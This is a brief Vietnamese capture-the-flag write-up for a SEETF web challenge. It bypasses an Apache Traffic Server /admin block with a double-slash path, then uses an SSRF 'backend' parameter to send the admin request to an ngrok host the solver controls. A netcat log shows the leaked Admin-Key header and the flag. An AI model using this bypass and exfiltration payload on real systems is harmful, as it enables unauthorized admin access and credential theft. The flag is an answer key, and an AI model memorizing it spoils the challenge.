# Solution

Khai thác từ các tricks: <https://nhienit.wordpress.com/2022/03/04/write-up-nimja-at-nantou-tsj-ctf-2022/>, <https://fireshellsecurity.team/tsjctf-nimja-at-nantou/#architecture>

remap.config được cấu hình để ngăn không cho ta truy cập vào `/admin`, nhưng bởi vì apache traffic server có cơ chế normalize path, `//admin` sẽ được hiểu như `/admin` => bypass

payload: 

`http://flagportal.chall.seetf.sg:10001//admin?backend=http://6678-2402-800-63b7-e8ea-20ed-33d2-7fb3-3c9b.ngrok.io?query=string`

response:
```
PS C:\Users\ASUS> nc -lnvp 8888
listening on [any] 8888 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 58065
POST /?query=string HTTP/1.1
Host: 6678-2402-800-63b7-e8ea-20ed-33d2-7fb3-3c9b.ngrok.io
User-Agent: Ruby
Content-Length: 37
Accept: */*
Accept-Encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3
Admin-Key: spendable-snoring-character-ditzy-sepia-lazily
Content-Type: application/x-www-form-urlencoded
First-Flag: SEE{n0w_g0_s0lv3_th3_n3xt_p4rt_bf38678e8a1749802b381aa0d36889e8}
X-Forwarded-For: 34.131.58.145
X-Forwarded-Proto: http

target=https%3A%2F%2Fbit.ly%2F3jzERNa
```

**SEE{n0w_g0_s0lv3_th3_n3xt_p4rt_bf38678e8a1749802b381aa0d36889e8}**


